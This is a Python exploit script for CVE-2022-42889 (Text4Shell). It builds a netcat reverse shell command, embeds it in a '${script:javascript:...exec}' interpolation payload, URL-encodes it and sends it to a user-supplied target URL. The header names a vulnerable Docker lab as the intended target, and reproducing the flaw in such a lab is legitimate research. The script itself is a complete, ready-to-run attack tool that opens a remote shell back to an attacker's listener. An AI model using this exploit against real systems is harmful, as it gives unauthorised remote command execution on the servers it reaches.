#!/usr/bin/python3

################################################################################
# name: cve-2022-42889.py
# Desc: Python script to exploit CVE-2022-42889 
# Author: S3L33
# Vuln Docker: https://github.com/karthikuj/cve-2022-42889-text4shell-docker
# 
################################################################################

#import necessary libraries
import requests
import urllib.parse
import sys

#setting global vars
LHOST = ""
LPORT = ""
URI = ""



# Function to generate our payload with user args
def generate_payload(LHOST, LPORT, URI):

    # generate the netcat reverse shell
    CMD = "nc {0} {1} -e /bin/sh".format(LHOST, LPORT)
    print("[+] - Netcat reverse shell generated: {0}".format(CMD))

    # Generate the payload with the populated netcat reverse shell
    payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('%s')}" % CMD
    print("[+] - Reverse Shell added to malicious Payload: {0}".format(payload))

    # URL Encode the payload
    encoded = urllib.parse.quote(payload)
    print("[+] - URL Encoded Payload: {0}".format(encoded))

    #combine the payload with the target URI
    request_payload = URI + encoded
    print("[+] - Malicious request generated:\r\n{0}".format(request_payload))
    return request_payload


# Run exploit
try:
    # check for 0 arguements and print help
    if len(sys.argv) <= 3:
        print("Usage:\n./cve-2022-42889.py <listening ip> <listening port> <target url>\n\r example: ./cve-2022-42889.py 127.0.0.1 4444 http://localhost/vulnerable?search=")

    # if arguements recieved run exploit
    else:
        # run payload generator and return 
        print("{0},{1},{2}".format(sys.argv[1], sys.argv[2], sys.argv[3]))
        malicious_payload = generate_payload(sys.argv[1], sys.argv[2], sys.argv[3])
        print("\r\n[+] - Sending Malicious Payload..")

        #send payload to target
        malicious_request = requests.get(malicious_payload)
        if len(malicious_request.text) > 0:
            print("\r\n[+] - Payload Sent! Did we get a shell?")
        else:
            print("[+] - We never got a response.")
except Exception:
    print(traceback.print_exc())
